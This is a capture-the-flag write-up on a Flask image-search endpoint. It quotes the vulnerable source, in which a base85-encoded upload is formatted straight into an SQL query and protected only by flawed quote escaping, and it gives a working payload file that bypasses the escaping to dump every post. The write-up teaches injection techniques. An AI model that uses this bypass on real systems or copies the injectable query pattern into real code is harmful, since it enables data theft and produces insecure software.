# 85 Reasons Why

I can give you 85 reasons why you should escape your sql.

![prompt](https://i.imgur.com/0l3sYeX.png)

## Reconnaisance

In `app/views.py` of the source code, we find the following endpoint in the application:

```python
@app.route('/image-search', methods=['GET', 'POST'])
def image_search():
    if 'image-query' not in request.files or request.method == 'GET':
        return render_template('image-search.html', results=[])

    incoming_file = request.files['image-query']
    size = os.fstat(incoming_file.fileno()).st_size
    if size > MAX_IMAGE_SIZE:
        flash("image is too large (50kb max)");
        return redirect(url_for('home'))

    spic = serialize_image(incoming_file.read())
    print("You inputted", spic) # added by me for debugging purposes

    try:
        res = db.session.connection().execute(\
            text("select parent as PID from images where b85_image = '{}' AND ((select active from posts where id=PID) = TRUE)".format(spic)))
    except Exception as e:
        print(e)
        return ("SQL error encountered", 500)

    results = []
    for row in res:
        post = db.session.query(Post).get(row[0])
        if (post not in results):
            results.append(post)

    return render_template('image-search.html', results=results)
```

As we can see, the code sends an sql query by directly substituting in the serialized submitted image. This is an immediate red flag as if we control what the image serializes to, we can perform an sql injection attack.

The serialization function is in `app/utils.py` and is below:

```python
def serialize_image(pp):
    b85 = base64.a85encode(pp)
    b85_string = b85.decode('UTF-8', 'ignore')

    # identify single quotes, and then escape them
    b85_string = re.sub('\\\\\\\\\\\\\'', '~', b85_string)
    b85_string = re.sub('\'', '\'\'', b85_string)
    b85_string = re.sub('~', '\'', b85_string)

    b85_string = re.sub('\\:', '~', b85_string)
    return b85_string
```

From this we can discern that the image is first serialized with base85 and then has a few find and replaces to "mitigate" SQL injections.

## Exploitation

From the vulnerabilities, the overall plan to attack the application is to create an "image" which base85 encodes into an sql injection payload.

To rapidly test different sql injection strings, I wrote the following function in a python repl along with `serialize_image()`:

```python
def get_payload(sql):
    return base64.a85decode(sql)
```

I started with a basic injection `a' or "secret" like "%" --` which will result in the sql query selecting all posts. Since base85 does not have spaces, we must remove the spaces to get `a'or"secret"like "%"--`.

`serialize_image()` escapes the `'` which is a problem since without the `'`, we cannot close the string in the sql command. To get around this, we can replace the `'` with the `\\\\\\\\\\\\\'` from the substitution.

After adding a few characters to the beginning and end to make the string valid base85, we get a base85 of `"ao\\\\\\\\\\\\\'or\"secret\"like\"%\"--kjk"` which will end up decoding to `ao\\\'or"secret"like"%"--kj`. The triple `\` ends up confusing sqlite and doesn't properly escape the `'` into a string terminator. Adding another `\\` to the sequence of `\\\\` in the payload successfully decodes to `ao\\\\'or"secret"like"%"--kj` which gives us all the posts.

I then saved the payload in a file with
```python
with open("sqli.png", "wb+") as fout:
    fout.write(get_payload("ao\\\\\\\\\\\\\\\'or\"secret\"like\"%\"--kjk"))
```

and uploaded it to the image search.

The flag was captured

![flag](https://i.imgur.com/dxcTSIr.png)